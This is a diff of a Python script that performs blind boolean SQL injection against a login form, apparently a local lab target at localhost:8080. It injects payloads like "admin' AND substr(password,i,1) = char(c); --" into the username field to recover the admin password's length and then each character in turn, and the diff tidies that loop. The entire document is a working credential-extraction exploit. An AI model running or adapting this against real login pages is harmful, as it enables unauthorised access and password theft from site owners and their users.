@@ -7,6 +7,15 @@ headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
 }
 
+def isValid(r):
+    return r.content.find(b"Connection") == -1
+
+def prettyPrint(passwd, length, i):
+    print(''.join(passwd), end="")
+    for l in range(length - i):
+        print("*", end="")
+    print(" [" + str(i) + "/" + str(length) + "]")
+
 def findPassLength():
     print("-- Try to find out password length --")
     length = None
@@ -15,12 +24,11 @@ def findPassLength():
         query = "admin' AND length(password) = " + str(i) + "; --",
         parameters = {
             'username': query,
-            'password': '',
+            'password': 'password',
         }
 
-        r = requests.post("http://localhost:8080/index.php", parameters, headers=headers)
-
-        if r.content.find(b"Connection") == -1:
+        r = requests.post("http://localhost:8080/", parameters, headers=headers)
+        if isValid(r):
             length = i
             break
 
@@ -31,34 +39,26 @@ def findPassLength():
 
 def findPass():
     length = findPassLength()
-    print("-- Try to find out password combinaison --")
+    print("-- Try to find out password combination --")
     passwd = []
 
     for i in range(1, length + 1):
         for c in range (33, 127):
-            query = "admin' AND substr(password," + str(i) + ",1) = char(" + str(c) + "); --",
-
-            #print(query)
+            query = "admin' AND BINARY substr(password," + str(i) + ",1) = char(" + str(c) + "); --",
             parameters = {
                 'username': query,
-                'password': '',
+                'password': 'password',
             }
 
-            r = requests.post("http://localhost:8080/index.php", parameters)
-
-            if r.content.find(b"Connection") == -1:
+            r = requests.post("http://localhost:8080/", parameters)
+            if isValid(r):
                 passwd.append(chr(c))
                 break
             
             time.sleep(0.01)
 
-        ## Pretty print
-        print(''.join(passwd), end="")
-        for l in range(length - i):
-            print("*", end="")
-        print(" [" + str(i) + "/" + str(length) + "]")
-
-        time.sleep(0.2)
+        prettyPrint(passwd, length, i)
+        time.sleep(0.1)
 
     print("-- Password Found --")
     print(''.join(passwd))
